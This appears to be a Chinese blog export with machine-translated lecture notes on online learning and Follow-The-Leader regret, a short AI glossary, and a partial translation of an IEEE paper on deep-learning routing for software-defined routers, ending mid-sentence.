<li><strong>高概率界限</strong> 到目前为止专家和强盗算法的大部分后悔限制只能保持预期; 算法使用随机化，如果我们运气不好，那么我们可以做的比我们应该的界限更糟糕。 但是，通过对算法的一些修改，我们可以设计出能够以高概率保证良好性能的算法。</li>
<li><strong>随机匪徒</strong> 到目前为止，引入的强盗算法没有对专家&#x2F;行动的回报做出统计假设。 假设数据集分布是独立的并且相同地分布在i.i.d. 但是，我们不知道确切的分布函数。 如果我们知道奖励遵循一些（未知）分布，我们能获得更好的界限吗？</li>
<li><strong>对抗性强盗</strong>：数据集上的奖励分配可以任意改变</li>
<li><strong>上下文强盗</strong> 基本强盗算法必须在没有任何附加上下文的帮助下选择一个动作。 然而，上下文强盗算法可以在每次做出决定时利用关于世界当前状态的附加信息。 例如，在网页上放置广告时，我们可能会根据网页内容做出不同的决定。</li>
<li><strong>高级主题</strong> 高级主题可能包括对博弈论与在线学习之间关系的考察; 在线学习算法在批量机器学习问题中的应用; 组合结构的专家和强盗问题; 和选择性采样和标签效率。</li>
</ul>
<h1 id="lecture-1"><a href="#lecture-1" class="headerlink" title="lecture 1"></a>lecture 1</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在线预测可以被认为是一个玩家（也就是预测者，学习算法）和环境（也就是对手）之间的重复博弈。T表示游戏的轮数。 在每一轮$t(t &#x3D; 1, …, T)$中，玩家和环境以下面的直观形式玩游戏</p>
<ul>
<li>环境：选择问题实例</li>
<li>玩家：对此实例进行预测</li>
<li>环境：对此预测造成$loss \in R$。 （玩家更喜欢较小的损失。）。 将有关预测准确性的反馈发送给玩家。</li>
<li>玩家：学习并记录反馈</li>
</ul>
<h3 id="示例：在线二进制预测游戏"><a href="#示例：在线二进制预测游戏" class="headerlink" title="示例：在线二进制预测游戏"></a>示例：在线二进制预测游戏</h3><p>在线二进制预测具有许多应用，例如电子邮件垃圾邮件分类，其可能不适合随机模型。 在此应用程序中，玩家会观察电子邮件的某些功能并进行二进制预测，无论是垃圾邮件还是非垃圾邮件。 以下是详细信息：每轮$t &#x3D; 1, …, T $</p>
<ul>
<li>玩家观察一个由环境生成的实例的特征向量$x_t \in R^n $</li>
<li>玩家进行二进制预测$\widehat{y_t} \in \{+1, -1\} $<br>$ +1, -1$分别代表“垃圾邮件”和“非垃圾邮件”</li>
<li>玩家观察反馈$y_t \in \{+1, -1\} $</li>
<li>产生损失$\ell_t &#x3D; l_{\widehat{y_t} \neq y_t} $</li>
</ul>
<p>几轮之后，累计损失是$\sum_{t &#x3D; 1}^T\ell_t$。 直观地说，最终需要“小的”累积损失。<br>这里我们提出了二元预测游戏的等价定义。 对于$t &#x3D; 1, …, T $，</p>
<ul>
<li>玩家从假设类$H$中选择一个假设（也就是二元分类器）$h_t$。<br>$$ h_t: R^n \rightarrow \{+1, -1\} $$<br>该假设是从特征向量$x \in R^n$映射到二进制预测集（例如$\{+1, -1\}$）的函数，在回合$t$中，$h_t$的选择可以基于$t$之前记录的所有信息。</li>
<li>环境选择$\{x_t, y_t\}$。</li>
<li>玩家遭受损失$\ell_t &#x3D; l_{h(x_t) \neq y_t} $</li>
<li>让我们首先定义二元线性预测器和铰链损失函数。假设$h_w: R^n \rightarrow \{+1, -1\}$<br>$$ h_w(x) &#x3D; sign(w \cdot x) &#x3D; \left\{\begin{array}{ll}<br>  +1 &amp; if w \cdot x &gt; 0 \\<br>  -1 &amp; if w \cdot x &lt; 0<br>\end{array}\right. $$<br>称为二元线性预测器。 该假设的唯一参数是向量$w \in R^n$。</li>
<li>几何上，所有垂直于$w$的向量（即零内积）形成一个超平面$\{x: w \cdot x &#x3D; 0\} $，如图1所示。数据可能属于半空间$\{x: w \cdot x &gt; 0\}$和$\{x: w \cdot x &lt; 0\}$之一。$ | w \cdot x |$可以解释为预测置信度。</li>
</ul>
<img src = "2019_01_04_01.png" width = 50%>

<h3 id="示例：具有铰链损耗的在线二元线性预测器"><a href="#示例：具有铰链损耗的在线二元线性预测器" class="headerlink" title="示例：具有铰链损耗的在线二元线性预测器"></a>示例：具有铰链损耗的在线二元线性预测器</h3><ul>
<li>假设类$H$<br>$$ H &#x3D; \{h_w(x): w \in R^n, ||w||_2 \leq 1\} $$<br>是二元线性预测变量的类。</li>
<li>已经提出了许多损失函数来对预测误差$\ell_t &#x3D; l_{\widehat{y_t} \neq y_t}$进行惩罚仅仅是误差指示，或称为零丢失。铰链损失定义为<br>$$ l(w;(x_t, y_t)) &#x3D; max\{0, 1 - y_tw \cdot x_t\} $$</li>
<li>如图2所示，铰链损失函数对错误预测（$ y_tw \cdot x_t &lt; 0 $）和具有小置信度（$ 0 \leq y_tw \cdot x_t &lt; 1 $）的正确预测施加惩罚。</li>
</ul>
<img src = "2019_01_04_02.png" width = 50%>

<ul>
<li>具有铰链损耗的二元线性预测游戏可以如下呈现。对于$t &#x3D; 1, …, T $<ul>
<li>玩家选择$w_t \in W $，其中$W &#x3D; \{w \in R^n: ||w||_2 \leq 1\} $，$ R^n$中的单位球</li>
<li>环境选择$(x_t, y_t)$。</li>
<li>玩家输了损失$\ell_t(w_t; (x_t, y_t)) &#x3D; max\{0, 1 - y_tw \cdot x_t \}$。 （$ x_t, y_t$被视为$\ell_t$的参数。）</li>
<li>玩家收到反馈$(x_t, y_t)$。</li>
</ul>
</li>
<li>此游戏设置可以概括为在线凸优化（OCO），将在下一节中讨论。</li>
</ul>
<h2 id="在线凸优化-OCO"><a href="#在线凸优化-OCO" class="headerlink" title="在线凸优化(OCO)"></a>在线凸优化(OCO)</h2><ul>
<li>对于$t &#x3D; 1, …, T $<ul>
<li>玩家选择$w_t \in W$，其中$W$是$R^n$中的凸集。</li>
<li>环境选择凸损函数$f_t: W \rightarrow R $。</li>
<li>玩家输了损失$\ell_t &#x3D; f_t(w_t) &#x3D; f_t(w_t; (x_t, y_t))$。</li>
<li>玩家收到反馈$f_t $。</li>
</ul>
</li>
<li>假设：环境是对$w_1, …, w_T$是遗忘的（未察觉;不知道……），但可以任意定义$f_1, …, f_T$（可能是恶意的，即使完全了解玩家的算法，并具有无穷大的计算能力）</li>
<li>然后，最后，累积损失$\sum_{t &#x3D; 1}^T \ell_t$可以任意大。 如何评估预测性能？ 什么是性能的良好基准？</li>
<li>一个好的选择是事后最佳固定（或静态）假设的累积损失，<br>$$ \min\limits_{w \in W} \sum_{t &#x3D; 1}^{T}f_t(w) $$</li>
<li>要选择这个最好的固定假设，我们需要知道未来，即收集所有$f_1, …, f_T $，然后运行离线算法。</li>
<li>事后确定假设的实际累积损失与最小累积损失之间的差异被定义为遗憾，<br>$$ R(T) &#x3D; \sum_{t &#x3D; 1}^Tf_t(w_t) - \min\limits_{w \in W} \sum_{t &#x3D; 1}^T f_t(w) $$<ul>
<li>如果后悔线性增长，$ R(T) &#x3D; \Omega(T) $，玩家不会学习。</li>
<li>如果后悔亚线性增长，$ R(T) &#x3D; o(T) $，玩家正在学习并且其预测准确性正在提高。</li>
<li>随着T进入无穷大，每轮的遗憾变为零<br>$$ \frac{1}{T}(\min\limits_{w \in W} \sum_{t &#x3D; 1}^T f_t(w)) \rightarrow 0, T \rightarrow \infty $$<br>-$R(T) &#x3D; O(\sqrt{T}) $。</li>
</ul>
</li>
</ul>
<h2 id="在线学习与统计学习的比较"><a href="#在线学习与统计学习的比较" class="headerlink" title="在线学习与统计学习的比较"></a>在线学习与统计学习的比较</h2><table><tr><th> </th><th>在线学习（OL）</th><th>统计学习（SL）</th></tr><tr><th rowspan="3">相同</td><td colspan="2">两者都定义了假设空间/类预测器（在在线学习的游戏的每一轮中，而在统计学习的训练过程中）</td></tr><tr><td colspan="2">两者都定义了损失函数来评估预测性能，并且优选小损失</td></tr><tr><td colspan="2">实例和标签</td></tr><tr><th rowspan="2">不同</td><td>在每轮比赛中学习，训练和测试之间没有区别</td><td>首先训练一个模型，然后进行测试</td></tr><tr><td>对手案</td><td>统计假设</td></tr></table>

<h1 id="lecture-2"><a href="#lecture-2" class="headerlink" title="lecture 2"></a>lecture 2</h1><h2 id="回顾在线凸优化算法"><a href="#回顾在线凸优化算法" class="headerlink" title="回顾在线凸优化算法"></a>回顾在线凸优化算法</h2><ul>
<li>对于$t &#x3D; 1, 2, …, T $</li>
<li>玩家选择$w_t $</li>
<li>对手选择$f_t$（和玩家的决策同时）</li>
<li>玩家的损失$f_t(w_t)$计算</li>
<li>玩家观察$f_t $</li>
</ul>
<h2 id="真实世界的例子-谷歌搜索"><a href="#真实世界的例子-谷歌搜索" class="headerlink" title="真实世界的例子 - 谷歌搜索"></a>真实世界的例子 - 谷歌搜索</h2><h3 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h3><p>在课堂上，我们探索了一个真实的世界环境</p>
<ul>
<li>用户输入查询“烹饪的乐趣”。</li>
<li>Google的广告服务器回复了一系列要向用户展示的广告。</li>
<li>用户可能会点击其中一个广告。<br>然后我们可能会问以下问题。<br>Google如何决定向用户展示哪些广告？</li>
</ul>
<p>要确定此设置的在线学习方面，我们首先会探讨广告服务器运行的一些流程。 广告服务器执行以下过程：</p>
<ol>
<li>匹配关键字上的广告。 例如，关键字“烹饪”可以从用户的查询中提取，并且可以与与烹饪相关的广告匹配。</li>
<li>对于每个广告，我们计算要素$x \in R^n$，然后查询预测模型以估计广告被点击的概率。 请注意，这意味着我们会比实际展示的广告更多地匹配和预测广告。</li>
<li>运行拍卖，其考虑从上一步骤计算的点击概率，以及广告的货币价值。</li>
<li>选择要显示的广告。</li>
</ol>
<p>我们专注于学习问题，我们正在尝试预测特定用户点击广告的可能性。</p>
<h3 id="示例模型"><a href="#示例模型" class="headerlink" title="示例模型"></a>示例模型</h3><ul>
<li>在课堂上，我们假设了一个线性模型$w \in R^n$。</li>
<li>鉴于权重，我们可能会决定做出这样的预测：<br>$$ \hat{p} &#x3D; w \cdot x $$</li>
<li>但是，由于我们试图预测概率，我们希望将预测标准化为0到1之间。</li>
<li>也就是说，我们需要一个函数$f(x)$，使得$f: R \rightarrow [0, 1]$。</li>
<li>我们也希望这个函数递增，因此更高的$x$将对应更高的概率。 实现此目的的常见函数是sigmoid函数$\sigma(x) &#x3D; \frac{1}{1 + e^{-x}}$。</li>
</ul>
<img src = "2019_01_05_03.png" width = 50%>

<ul>
<li>因此，我们预测概率如下：</li>
<li>请注意，这正是逻辑回归模型计算输入示例的类概率的方式。</li>
<li>为了学习模型，我们有一个接受$(x，y)$对的训练系统，其中$x$是广告的特征向量，$y$是相应的标签，在这种情况下表示用户是否点击了 广告</li>
<li>仍然使用逻辑回归模型，如果我们使用在线梯度下降来优化损失函数，训练过程将如此</li>
<li>（我们使用1来表示点击广告，否则为0，以便在使用在线梯度下降进行逻辑回归时进行数学运算。）</li>
</ul>
<table>
<thead>
<tr>
<th>训练过程 - 逻辑回归的SGD</th>
</tr>
</thead>
<tbody><tr>
<td>对于每一个$(x, y) $，<br>$\hat{p} &#x3D; \sigma(w_t \cdot x)$<br>$g &#x3D; (\hat{p} - y)x$<br>$w_{t + 1} \leftarrow w_t - \eta g$</td>
</tr>
</tbody></table>
<ul>
<li>请注意，在实际设置中，我们必须使用从训练过程中获得的新权重向量更新广告服务器使用的$w$。</li>
</ul>
<h3 id="问题和挑战"><a href="#问题和挑战" class="headerlink" title="问题和挑战"></a>问题和挑战</h3><p>在实际设置中，$ n $，特征向量的维度可以是数十亿的数量级。 除此之外，在线设置也带来了一些挑战：</p>
<ol>
<li>只需编写模型$w$就会占用太多空间。而且，我们想在那里寻找最好的模型</li>
<li>通过做一个正常的点积来天真地计算预测将太慢，特别是考虑到我们想要以数百毫秒的顺序向用户提供反馈的约束。<ul>
<li>幸运的是，即使$w$很密集，特征向量$x$通常也很稀疏。如果我们使用一袋单词表示，则尤其如此。</li>
<li>然后，计算$w \cdot x$将仅涉及与$x$中的非零元素的数量成比例的多个操作，而不是$n$。</li>
</ul>
</li>
<li>即使我们在$(x，y)$示例中表现良好，我们也必须记住，这些示例是从实际显示的广告中获得的。 因此，可能会出现一些未示出的广告实际上是好的。 与此相关的未来主题是探索。</li>
</ol>
<h3 id="映射回OCO"><a href="#映射回OCO" class="headerlink" title="映射回OCO"></a>映射回OCO</h3><ul>
<li>回到OCO公式，我们看到$w_t$是训练过程输出的权重向量。</li>
<li>由于我们选择使用逻辑回归作为模型，我们希望我们的损失函数与条件似然相关。</li>
<li>课堂上选择的具体形式是$f_t &#x3D; log(1 + exp(-y_t(w \cdot x_t)))$。</li>
<li>课堂上评论说，这种损失功能可以看作是铰链损失的<strong>软版本</strong>。下图显示了这一点。</li>
</ul>
<img src = "2019_01_05_04.png" width = 50%>

<ul>
<li>但是，也有一些观点认为OCO没有对给定示例的某些方面进行建模。例如，在玩家实际观察$f_t$之前有一段延迟，因为此信息仅在用户做出点击决定后才可用。</li>
</ul>
<h3 id="关于使用遗憾分析的评论"><a href="#关于使用遗憾分析的评论" class="headerlink" title="关于使用遗憾分析的评论"></a>关于使用遗憾分析的评论</h3><ul>
<li>要审核，<br>$$ Regret &#x3D; \sum_{t}f_t(w_t) - \min\limits_{w \in W} \sum_{t} f_t(w) $$</li>
<li>在比较两种型号A和B时，我们注意到我们可以取消右侧的常数项：<br>$$ Regret(A) - Regret(B) &#x3D; \sum_{t}f_t(A_t) - \sum_{t} f_t(B_t) &#x3D; Loss(A) - Loss(B) $$</li>
<li>当使用遗憾作为优化的度量标准时，如果在对模型进行更改时$W$已经改变，我们必须要小心; 更高的遗憾可能误导我们认为模型比另一模型更糟，但这不一定是真的。</li>
</ul>
<h2 id="跟随领导者（FTL）算法"><a href="#跟随领导者（FTL）算法" class="headerlink" title="跟随领导者（FTL）算法"></a>跟随领导者（FTL）算法</h2><ul>
<li>我们探索在OCO框架中应用的第一个新算法是Follow-The-Leader，它被描述为最简单，最自然，最不实用的在线学习算法。 本节的大部分内容改编自Shai Shalev-Shwartz [1]的调查。</li>
</ul>
<table>
<thead>
<tr>
<th>Follow-The-Leader</th>
</tr>
</thead>
<tbody><tr>
<td>$w_1$是任意设定的 <br> 对于$t &#x3D; 1, 2, …, T$<br>$w_t &#x3D; \arg\min\limits_{w \in W} \sum_{s &#x3D; 1}^{t - 1}f_s(w)$</td>
</tr>
</tbody></table>
<ul>
<li>查看算法有两种方法。<ol>
<li>我们正在围绕权重向量进行游戏，如果游戏在第$t - 1$轮停止，则最小化后悔。</li>
<li>我们将所有看到的例子用作批处理机器学习问题，并求解最佳权重向量。</li>
</ol>
</li>
<li>我们注意到，运行此算法的时间越长，算法越慢，因为批处理问题变得越来越大（不切实际）。</li>
<li>我们现在证明我们的第一个遗憾。 请注意，遗憾也可以表示为相对于所选择的向量，而不是仅仅事后与最佳模型进行比较。 在下面的引理中，$Regret(u)$表示对向量$u$的遗憾。</li>
<li>引理1.由FTL扮演的点$w_1, w_2, …, w_T$满足<br>$$ \forall u \in W, Regret(u) \leq \sum\nolimits_{t &#x3D; 1}^{T} (f_t(w_t) - f_t(w_{t + 1})) $$</li>
</ul>
<h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><ul>
<li><strong>证明</strong>。 我们首先重述引理。替换$Regret(u)$的定义给出了以下等价声明：<br>$$ \sum\nolimits_{t &#x3D; 1}^{T}(f_t(w_t) - f_t(u)) \leq \sum\nolimits_{t &#x3D; 1}^{T}(f_t(w_t) - f_t(w_{t + 1})) $$</li>
<li>减少到<br>$$ \sum_{t &#x3D; 1}^{T}f_t(w_{t + 1}) \leq \sum_{t &#x3D; 1}^{T}f_t(u) $$</li>
<li>在课堂上，不等式左侧的表达式被称为Be-The-Leader（BTL）算法的累积损失，该算法通过查看下一个示例而作弊。 该术语由Kalai等人提出。[2]</li>
<li>我们现在用感应来证明<br>$$ \forall u \in W, \sum_{t &#x3D; 1}^{T}f_t(w_{t + 1}) \leq \sum_{t &#x3D; 1}^{T}f_t(u) $$</li>
<li><strong>基本情况</strong>。 对于任何$u$，$T &#x3D; 1. f_1(w_2) \leq f_1(u)$都是真的，因为$w_2$使$f_1$最小化。回想起那个<br>$$ w_2 &#x3D; \arg\min\limits_{w \in W} \sum\nolimits_{s &#x3D; 1}^{2 - 1}f_s(w) &#x3D; \arg\min\limits_{w \in W} f_1(w) $$</li>
<li><strong>归纳假设</strong>。我们假设上述陈述适用于时间$T - 1$，即<br>$$ \forall u \in W, \sum_{t &#x3D; 1}^{T - 1}f_t(w_{t + 1}) \leq \sum_{t &#x3D; 1}^{T - 1}f_t(u) $$</li>
<li><strong>归纳步骤</strong>。从上面的I.H.中，我们通过以下序列的等价不等式表明该陈述适用于时间T来完成归纳步骤：<br>$$ \begin{aligned}<br>  \sum_{t &#x3D; 1}^{T - 1}f_t(w_{t + 1}) &amp; \leq \sum_{t &#x3D; 1}^{T - 1}f_t(u) \\<br>  \sum_{t &#x3D; 1}^{T - 1}f_t(w_{t + 1}) + f_T(w_{t + 1}) &amp; \leq \sum_{t &#x3D; 1}^{T - 1}f_t(u) + f_T(w_{t + 1}) \\<br>  \sum_{t &#x3D; 1}^{T}f_t(w_{t + 1}) &amp; \leq \sum_{t &#x3D; 1}^{T - 1}f_t(u) + f_T(w_{t + 1})<br>\end{aligned} $$</li>
<li>由于上述陈述适用于所有$u$，我们可以采用$u &#x3D; w_{T + 1}$，这给了我们<br>$$ \sum_{t &#x3D; 1}^{T}f_t(w_{t + 1}) \leq \sum_{t &#x3D; 1}^{T}f_t(w_{T + 1}) $$</li>
<li>我们可以将不等式右侧的项视为向量的函数，$f(v) &#x3D; \sum_{t &#x3D; 1}^{T}f_t(v)$。在这种情况下，参数是$v &#x3D; w_{T + 1}$。我们注意到$w_{T + 1}$恰好是$f(v)$的最小化。因此，对于所有$u$，$\sum_{t &#x3D; 1}^{T}f_t(w_{T + 1}) \leq \sum_{t &#x3D; 1}^{T}f_t(u)$。有了这个最终的不平等，我们就结束了归纳证明。</li>
</ul>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul>
<li>我们现在探索一个FTL表现不佳的例子。</li>
<li><strong>示例1</strong> 假设$W \in [-1, 1], f_t(w) &#x3D; g_t w$，其中$g_t \in [-1, 1]$由对手选择，并且玩家选择$w_t$。 我们还将$\sum_{s &#x3D; 1}^{t} g_s$缩写为$g_{1 : t}$</li>
<li>下面我们展示一个玩家与FTL策略之间的任意选择$w_1 &#x3D; 0$的游戏，以及一个想要让玩家产生损失的对手（请注意，对手也知道FTL策略是确定性的）。</li>
<li>我们还在右侧显示BTL策略进行比较。 我们考虑FTL策略在此设置下将采取的措施，其中所使用的点由下式给出<br>$$ \begin{aligned}<br>  w_t &amp; &#x3D; \arg\min\limits_{w \in [-1, 1]} \sum_{s &#x3D; 1}^{t - 1}f_s(w) \\<br>  &amp; &#x3D; \arg\min\limits_{w \in [-1, 1]} \sum_{s &#x3D; 1}^{t - 1} g_s w \\<br>  &amp; &#x3D; \arg\min\limits_{w \in [-1, 1]} g_{1 : t - 1} w<br>\end{aligned} $$</li>
<li>因此，FTL策略总是选择与$g_{1 : t - 1}$相反的符号，幅度为1。<img src = "2019_01_10_05.png" width = 50%></li>
<li>FTL的遗憾是$(T - 1) - (-0.5) \approx T$，这很糟糕，因为我们希望遗憾是$o(T)$。</li>
<li>注意到BTL的累积损失是$\approx T$，使用我们刚刚证明的先前界限，我们得到了<br>$$ \forall u \in W, Regret(u) \leq (T - 0.5) - (-T + 0.5) &#x3D; 2T - 1 $$</li>
<li>上限高于$T$，这使得这一遗憾成为弱势。</li>
<li>在本节课结束时，暗示通过跟随规则化领导算法，我们可以通过添加正则项来提高FTL算法的稳定性。 但这是为下一节课！</li>
<li>参考文献<br>[1] Shai Shalev-Shwartz，“在线学习和在线凸优化”，机器学习的基础和趋势，2012。<br>[2] Adam Kalai，Santosh Vempala，“在线决策问题的有效算法”，计算机与系统科学期刊，2005年。</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
  </entry>
  <entry>
    <title>名词解释</title>
    <url>/blogs/2019-01-02-glossary/</url>
    <content><![CDATA[<h1 id="AI方向"><a href="#AI方向" class="headerlink" title="AI方向"></a>AI方向</h1><ul>
<li>MCTS(Monte Carlo Tree Search) 蒙特卡洛搜索树</li>
<li>RL(Reinforcement learning) 强化学习</li>
<li>RCNN(Residual Convolutional Neural Networks) 残余卷积神经网络</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>论文翻译——毕设任务</title>
    <url>/blogs/2018-12-27-routeOrComputerTranslate/</url>
    <content><![CDATA[<h1 id="抬头"><a href="#抬头" class="headerlink" title="抬头"></a>抬头</h1><p>本文已在本期刊的未来期刊中被接受发表，但尚未完全编辑。 内容可能会在最终发布之前发生变化 引用信息：DOI 10.1109 &#x2F; TC.2017.2709742，IEEE计算机上的交易</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>路由还是计算？基于深度学习的范式转向智能化计算机网络分组传输</p>
<h1 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h1><p>Bomin Mao，学生会员，IEEE，Zubair Md.Fadlullah，高级会员，IEEE，Fengxiao Tang，IEEE学生会员，Nei Kato，IEEE院士，Osamu Akashi，Takeru Inoue和Kimihiro Mizutani</p>
<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>近年来，软件定义路由器（SDR）（可编程路由器）已成为一种可行的解决方案，可提供具有易扩展性和可编程性的经济高效的数据包处理平台。多核平台显着地推动了SDR的并行计算能力，使他们能够采用人工智能技术，即深度学习来管理路由路径。在本文中，我们通过深度学习探索数据包处理的新机会，以便将计算需求从基于规则的路由计算转移到基于深度学习的路由估计，以实现高吞吐量数据包处理。尽管深度学习技术已在各种计算领域得到广泛应用，但迄今为止，研究人员还未能有效地利用基于深度学习的路由计算来实现高速核心网络。我们设想一个有监督的深度学习系统来构建路由表，并展示如何使用中央处理单元（CPU）和图形处理单元（GPU）将所提出的方法与可编程路由器集成。我们演示了我们独特的输入和输出流量模式如何通过分析和广泛的计算机模拟来增强基于深度学习的SDR的路由计算。值得一提的是，仿真结果表明我们的方案在延迟、吞吐量和信令开销方面优于基准方法。</p>
<h1 id="索引术语"><a href="#索引术语" class="headerlink" title="索引术语"></a>索引术语</h1><p>软件定义路由器，网络流量控制，深度学习，骨干网络，核心网络，路由。</p>
<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;互联网核心中的路由器见证了硬件的几代变化，而路由算法背后的主要思想在传统意义上非常相似。这是因为互联网核心和有线&#x2F;无线异构骨干网络的构建方式多年来基本保持不变[1]。另一方面，为了适应网络流量的巨大增长，互联网核心基础设施通过添加更多&#x2F;更大的路由器和更多&#x2F;更快的链路而继续扩展。越来越大的核心网络推动核心路由器的架构在计算和交换容量方面更加强大。即使最近数据流量激增，网络运营商也面临着流量管理的挑战，以确保服务质量（QoS）以及处理利润下降[2]。传统上，运营商依赖于硬件解决方案以便改善核心网络性能，即通过简单地增加路由器和&#x2F;或链路的数量和大小，这导致大量的投资挥霍。另一方面，交通管理的软件方面主要关注新路由策略的应用，这些策略在新一代功能强大的硬件架构出现之前可能是不可能的[3]。换句话说，由于连续变化的网络环境，软件驱动的路由策略的进步似乎总是落后于流行的路由策略。为了应用为不同网络服务开发的最先进的软件驱动路由算法，有必要提高核心路由器的可编程性。由于其专有的硬件架构，设计可编程路由器是一个具有挑战性的研究领域。因此，研究人员已经考虑使用软件定义路由器（SDR），其在商用硬件架构上部署可编程路由策略以执行分组处理和传输。作为软件定义网络（SDN）的关键组件，SDR不仅需要支持基于软件的数据包传输，还需要根据网络运营商的要求灵活地执行其他功能，以优化其网络。然而，最近涉及SDR的研究工作主要集中在增强其硬件方面，以便提高与基于硬件的路由器相当的处理吞吐量性能。例如，研究人员和网络制造商已经探索了基于多核的SDR [4]。虽然多核中央处理器（CPU）在相关研究领域占主导地位[5]，但图形处理单元（GPU）——加速SDR正在成为一项激动人心的研究领域。 这背后的原因是GPU同时运行数万个线程以有效处理数据包的固有能力[3]，[6]，[7]。 换句话说，GPU可以执行相同的程序以并行方式处理不同的数据集，这些数据也可以与多核CPU结合以同时进行不同的指令[8]。 GPU和CPU的协作可以显着提升SDR的数据包处理吞吐量[7]，可以将其视为现代骨干网的主流候选者。</p>
<ul>
<li>B. Mao，Z. M. Fadlullah，F. Tang和N. Kato在日本仙台东北大学信息科学研究生院工作。<br>电子邮件：{fbomin.mao，zubair，fengxiao.tang &amp; katog} @it.is.tohoku.ac.jp</li>
<li>O. Akashi，T. Inoue和K. Mizutani与日本电报电话公司（NTT）网络创新实验室合作。<br>电子邮件：{fakashi.osam，inoue.takeru，mizutani.kimihirog} @lab.ntt.co.jp</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了进一步完善骨干路由器硬件架构的研究，还需要改进网络流量控制策略，以满足近几十年来不断增长的流量需求[9]。这是因为良好的路由路径管理技术可以直接缓解（甚至克服）网络拥塞。在本文中，我们将重点放在分组路由策略的设计上。根据最大或最小度量值选择路径的基于规则的传统路由策略（例如，最短路径（SP）算法等）通常归因于显着慢收敛的缺点。此外，它们可能不是特别适合于多度量网络，因为难以手动估计多个度量之间的关系[10]。为了利用各种指标之间的复杂关系来决定最佳路径，基于机器学习的智能网络流量控制系统在广泛的网络环境中引起了广泛关注[11]，[12]。已经利用监督、无监督和强化学习技术来管理许多不同网络场景中的分组路由[13] - [15]，例如无线网状网络（WMN）[14]。然而，由于传统机器学习技术在处理多个网络参数时的低效率以及输入和输出特征化的困难，这些智能策略仍然基于规则的传统路由[16]，[17]。自2006年以来，已经见证了在深度学习架构（例如，多层神经网络）中已经实现了逐步突破，使得它们能够适应曾经只有人类占据主导地位的极其复杂的活动，例如谷歌的AlphaGo在复杂的棋盘游戏中的表现[18]。此外，GPU已经成为运行深度学习算法的最可行的硬件平台，因为它们具有高度并行的计算能力，而且还有各种GPU制造商提供的大量编程工具包[8]。因此，通过利用GPU加速的SDR来利用深度学习算法来实现智能网络流量控制（例如，智能路由管理）是可行的。</p>
<img src = "2019_01_04_01.png" width = 30%>
- 图1：最近的跨学科趋势表明涉及计算系统，计算机网络和机器智能的跨学科领域。 特别地，由于CPU / GPU技术的进步和深度学习，网络流量控制系统正变得健壮和智能

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在本文中的工作贡献如下。首先，我们从三个方面探讨路由策略，即网络流量控制，深度学习和CPU &#x2F; GPU计算架构，如图1所示。其次，我们提出了一种基于深度学习的GPU加速SDR路由表构建方法。在我们的提议中，我们采用有监督的深度信念架构（DBA）[19]来计算以边缘路由器的流量模式为输入的后续节点（即路由器）。第三，我们根据边缘路由器的传入流量模式，为我们采用的DBA提供输入和输出的独特特征。根据收集的数据训练所提出的DBA，所述数据包括入站流量模式和相应的后续节点（即，路由器）。此外，我们还演示了经过培训的DBA如何预测下一个节点。第四，我们展示了基于深度学习的路由策略在较低信令开销和快速收敛方面的优势，从而显着改善了流量控制。第五，我们通过分析和广泛的仿真结果证明了我们提出的基于深度学习的解决方案与基准路由方法相比的有效性。特别是，我们演示了我们的提案如何在GPU加速的SDR上工作，并在分析其复杂性后评估运行路由策略的时间成本。结果表明，所提出的路由策略在GPU上的运行速度比在CPU上快100多倍。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本文的其余结构如下。 第2节包括相关的研究工作。在第3部分中，我们描述了我们提出的路由DBA结构及其在GPU加速SDR中的工作原理。然后，我们在第4节和第5节介绍基于深度学习的路由策略的三个阶段，分析我们提案的复杂性，并比较GPU和CPU的理论时间成本。我们的提案的网络性能评估在第6节中介绍。最后，第7节结束了本文。</p>
<h1 id="2-相关研究工作"><a href="#2-相关研究工作" class="headerlink" title="2. 相关研究工作"></a>2. 相关研究工作</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本节中，我们将从硬件和软件角度介绍相关的研究工作，分别考虑SDR和深度学习的最新技术。 此外，在讨论深度学习相关研究的同时，我们还描述了文献中存在的相关机器智能路由策略。</p>
<h2 id="2-1-SDR相关研究工作"><a href="#2-1-SDR相关研究工作" class="headerlink" title="2.1 SDR相关研究工作"></a>2.1 SDR相关研究工作</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于深度学习执行需要高性能计算硬件的支持，因此有必要讨论最先进的SDR技术。尽管将数据包处理逻辑实施到硬件中的方法继续提高路由器的线路速率高达100 Gbps，但应用新的网络流量控制算法仍然是一个具有挑战性的问题，因为在可行性和可扩展性方面存在专用硬件的缺点[6],[20]。另一方面，基于通用硬件的SDR在分组处理中不是很有效，尽管它是可编程的和灵活的。由于多核解决方案可以显着提高计算能力，因此学术界和工业界的研究人员对利用CPU或GPU提供的多核和&#x2F;或线程并行运行路由任务以提高处理吞吐量表现出极大的兴趣。目前的SDR [6]，[21]。[21]中介绍的RouteBricks架构探索了一种新颖的网络架构，其中数据包在运行在通用PC硬件集群上的软件中处理。RouteBricks的IPv4转发吞吐量已经显示为高达8.7 Gbps和64B数据包。但是，由于CPU成为更多计算密集型应用程序的瓶颈，其性能可能不会超过10 Gbps。作为解决此问题的方法，PacketShader架构[3]将并行数据包处理的计算需求从CPU转移到GPU，因为GPU与CPU相比包含更多内核。使用单个商品PC评估此体系结构表明PacketShader能够以39 Gbps转发64B IPv4数据包。此外，在[3]中指出，通过扩展I &#x2F; 